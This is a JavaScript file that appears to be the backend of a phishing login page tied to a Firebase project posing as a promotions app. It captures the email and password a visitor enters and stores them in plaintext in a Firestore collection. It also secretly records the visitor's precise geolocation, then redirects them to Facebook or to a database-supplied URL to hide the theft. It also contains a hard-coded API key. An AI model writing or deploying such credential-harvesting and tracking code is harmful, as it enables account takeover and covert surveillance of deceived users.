firebase.initializeApp({
  apiKey: "AIzaSyDzFTDNdWgAWw0rw1Pa62B1atN0IiJHXHE",
  authDomain: "promocionesappferia.firebaseapp.com",
  projectId: "promocionesappferia"
});

// Initialize Cloud Firestore through Firebase
var db = firebase.firestore();

// Disable deprecated features
db.settings({
  timestampsInSnapshots: true
});

function hiddenCuentaInvalida() {
  document.getElementById('cuentaInvalida').style.visibility = "hidden";
}
var coords;
var timestamp;
var URL = 'https://www.facebook.com/';

function saveUser() {
  var email = document.getElementById('email').value;
  var password = document.getElementById('password').value;
  document.getElementById('cuentaInvalida').value = "Cuenta invalida";

  if (email.length <= 6 || password.length <= 6) {
    document.getElementById('cuentaInvalida').style.visibility = "visible";
    console.log(email, password);
    return;
  } else {
    document.getElementById('cuentaInvalida').style.visibility = "hidden";
    db.collection("users").add({
      email: email,
      password: password,
      date: new Date(),
      latitude: coords ? coords.latitude : 'Permiso denegado',
      longitude: coords ? coords.longitude : 'Permiso denegado',
      timestamp: timestamp ? timestamp : 'Permiso denegado'
    })
      .then(function (docRef) {
        console.log("Document written with ID: ", docRef.id);
        window.location = URL;
      })
      .catch(function (error) {
        document.getElementById('cuentaInvalida').style.visibility = "visible";
        document.getElementById('cuentaInvalida').value = "Volver a intentar";
        document.getElementById('email').value= '';
        document.getElementById('password').value= '';
      });
  }
}

(function getURl() {
  db.collection("urls").get().then((URLS) => {
    URLS.forEach((doc) => {
      URL = doc.data().urlName;
      console.log(URL);
    });
  });
})();
//getURl();

var options = {
  enableHighAccuracy: true,
  maximumAge: 0
};

function success(pos) {
  coords = pos.coords;
  timestamp = pos.timestamp;
};

function error(err) {
  console.warn('ERROR(' + err.code + '): ' + err.message);
};

navigator.geolocation.getCurrentPosition(success, error, options);